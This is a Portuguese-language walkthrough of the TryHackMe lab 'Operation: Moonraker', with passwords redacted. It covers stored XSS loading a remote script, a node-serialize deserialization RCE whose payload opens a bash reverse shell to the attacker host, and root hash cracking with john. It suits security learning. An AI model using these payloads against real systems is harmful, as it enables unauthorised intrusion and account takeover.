# Operation: Moonraker — Writeup

**Sala TryHackMe:** https://tryhackme.com/room/<SLUG-DA-SALA>  <!-- substitui pelo link real da sala -->

> ⚠️ De acordo com as regras de writeups da TryHackMe, este documento **não contém passwords, hashes crackados nem flags**. Mostra apenas a metodologia e os comandos; os segredos aparecem como `[REDACTED]`.

Tema: James Bond / *Moonraker* (Drax Industries).
Cadeia: Recon → Esteganografia → CouchDB → Desserialização Node.js (RCE) → Pivot de utilizadores → Crack de hash → Root.

---

## Resumo

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Recon | `nmap` | SSH, Apache :80, Express :3000, CouchDB :5984 |
| Enum web | `gobuster`, leitura manual | dirs, blog, formulário de vendas |
| Foothold info | esteganografia | password de um utilizador do CouchDB |
| Enum CouchDB | API REST autenticada | dirs escondidos via db `links` |
| Documentos | offer letters (PDF) | credenciais de utilizadores |
| XSS → recon | XSS armazenado + bot PhantomJS | código-fonte da app :3000 |
| **Foothold** | `node-serialize` deserialization (CVE-2017-5941) | shell de utilizador |
| Privesc 1 | reuso de password (`local.ini`) | pivot para outro utilizador |
| Privesc 2 | `.viminfo` + mail + crack de hash | root |

---

## 1. Reconhecimento

Descobrir o alvo e varrer todas as portas:

```bash
sudo nmap -sn <SUBNET>/24
nmap -p- -sV -T4 <ALVO>
```

```
22/tcp    open  ssh     OpenSSH 7.4p1
80/tcp    open  http    Apache httpd 2.4.25 (Debian)
3000/tcp  open  http    Node.js Express framework
4369/tcp  open  epmd    Erlang Port Mapper Daemon
5984/tcp  open  http    CouchDB httpd 2.2.0 (Erlang OTP/19)
34531/tcp open  unknown
```

Website clássico (:80), app Express (:3000) e **CouchDB** (:5984) sobre Erlang (4369/34531).

---

## 2. Enumeração web (porta 80)

```bash
gobuster dir -u http://<ALVO> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Pontos de interesse:

- **`/services/`** — menciona que alojam um NoSQL DB, oferecem "Secure Code Review" e está *"Made by Jaws"* (username).
- **`moonraker.html`** → link para `blog.html`.
- **`blog.html`** → lore e vários usernames (Jaws, Holly, Hugo, MoonrakerTech, Drax). Um post do Jaws contém uma **pista de passphrase** relacionada com uma personagem do filme.

### App Express (porta 3000)

Responde com **401 Basic Auth** a todos os pedidos:

```bash
curl -i http://<ALVO>:3000/
# WWW-Authenticate: Basic realm="401"
```

Fica pendente até obtermos credenciais.

---

## 3. Esteganografia → password de utilizador

O blog aponta para uma galeria de imagens e dá uma pista sobre a passphrase (nome de uma personagem). A password de um utilizador do CouchDB está escondida numa imagem:

```bash
steghide extract -sf <imagem>.jpg
# → ficheiro com a password  [REDACTED]
```

---

## 4. CouchDB (porta 5984)

O `_all_dbs` responde **sem autenticação** (fuga de informação):

```bash
curl http://<ALVO>:5984/_all_dbs
# ["_replicator","_users","links"]
```

Com a credencial obtida por esteganografia, lemos a db personalizada `links`:

```bash
curl -u <user>:[REDACTED] 'http://<ALVO>:5984/links/_all_docs?include_docs=true'
```

Ela revela **diretórios escondidos** (invisíveis ao gobuster porque não estão linkados):

| desc | link |
|------|------|
| Cat Photo Gallery | `/cats/cats-gallery.html` |
| Security Camera Clips | `/surv-cam/recent.html` |
| **HR Forms** | `/HR-Confidential/offer-letters.html` |
| Space Research Files | `/x-files/deep-space-findings.html` |

---

## 5. Offer Letters (documentos oficiais)

`/HR-Confidential/offer-letters.html` lista PDFs. Extrair texto:

```bash
wget http://<ALVO>/HR-Confidential/moonraker_<user>.pdf
pdftotext moonraker_<user>.pdf -
```

As cartas contêm **credenciais iniciais** de vários utilizadores (passwords `[REDACTED]`). A carta do CEO indica explicitamente que a sua página fica na **porta 3000**, fornecendo o par de credenciais para a Basic Auth da app Express:

```bash
curl -u <ceo>:[REDACTED] http://<ALVO>:3000/
```

---

## 6. XSS armazenado → descoberta do foothold

O formulário `/svc-inq/sales.html` (POST → `svc-processing.php`) indica que *"a sales rep will check inquiries in under 5 minutes"*. Um comentário HTML revela que o rep usa **Firefox** e consulta uma pasta web "especial" → **XSS armazenado**.

Listener + injeção de `<script>` remoto:

```bash
cd /tmp && python3 -m http.server 8000
```

```bash
curl -X POST http://<ALVO>/svc-inq/svc-processing.php \
  --data-urlencode 'field1=<script src="http://<KALI>:8000/pwn.js"></script>' \
  --data-urlencode 'field2=x' --data-urlencode 'submit=Submit'
```

O bot (a partir do próprio host) carrega o `pwn.js` → **XSS confirmado**. Um `pwn.js` de diagnóstico (que exfiltra `location.href`) revela a página consultada (`/svc-inq/salesmoon-gui.php`), que leva a um painel `/raker-sales/` e a um ficheiro de notas:

### Ficheiro de notas — a peça-chave

Contém o código-fonte da app :3000:

```js
var serialize = require('node-serialize');
...
var str = new Buffer(req.cookies.profile, 'base64').toString();
var obj = serialize.unserialize(str);   // desserialização insegura
```

→ **Desserialização insegura em `node-serialize`** via cookie `profile`.

---

## 7. Foothold — RCE por desserialização (CVE-2017-5941)

A `unserialize()` do `node-serialize` executa funções marcadas com `_$$ND_FUNC$$_` quando envolvidas numa IIFE `()`.

```bash
nc -lvnp 4444
```

```bash
cat > /tmp/rev.json <<'EOF'
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<KALI>/4444 0>&1\"');}()"}
EOF

B64=$(tr -d '\n' < /tmp/rev.json | base64 -w0)

curl 'http://<ALVO>:3000/' -u <ceo>:[REDACTED] --cookie "profile=$B64"
```

→ Shell de utilizador. Estabilizar:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 8. Privesc 1 — pivot de utilizador

O ficheiro de configuração do CouchDB guarda uma credencial comentada:

```bash
cat /opt/couchdb/etc/local.ini
```

```ini
[admins]
;<user> = [REDACTED]
```

Essa password está **reutilizada** como password de sistema de outro utilizador:

```bash
su <user>      # reuso de password
```

---

## 9. Privesc 2 — root

O utilizador não tem sudo, mas o `.viminfo` dele mostra que editou o seu mail e copiou uma linha para um registo do Vim:

```bash
cat /var/mail/<user>
```

O e-mail inclui a **linha do `/etc/shadow` do root** (hash `$6$` / sha512crypt) e uma **dica**: a password nova é a antiga com um sufixo acrescentado.

Crackar o hash **na Kali**:

```bash
echo '<HASH_SHA512_REDACTED>' > /tmp/root.hash
john --format=sha512crypt /tmp/root.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=sha512crypt /tmp/root.hash
```

Aplicar a dica do e-mail (sufixo) à password crackada e autenticar:

```bash
su root        # password derivada (crackada + sufixo)
id             # uid=0(root)
```

---

## Rabbit holes (para não perder tempo)

- `/accounting/caught.gif` e `wp-admin.php` → imagem de troça.
- `hugo-manif.mp3` → clip do filme, sem stego.
- `/cats/` gallery → decoração.
- `/x-files/` → "data moved to a more secure location".

---

## Lições / mitigações

1. **CouchDB:** não expor `_all_dbs` anonimamente; não reutilizar credenciais fracas.
2. **Credenciais em documentos** acessíveis na web (offer letters em PDF) é um vazamento clássico.
3. **XSS armazenado** + bot interno → sanitizar sempre input renderizado em painéis.
4. **`node-serialize.unserialize()` sobre input do utilizador = RCE.** Nunca desserializar dados não confiáveis.
5. **Reuso de passwords** entre serviço e sistema propaga o compromisso.
6. **Segredos em `.viminfo`/mail e hashes crackáveis (rockyou)** fecham o caminho a root.

---

*Writeup para fins educativos. Resolução da sala "Operation: Moonraker" no TryHackMe.*
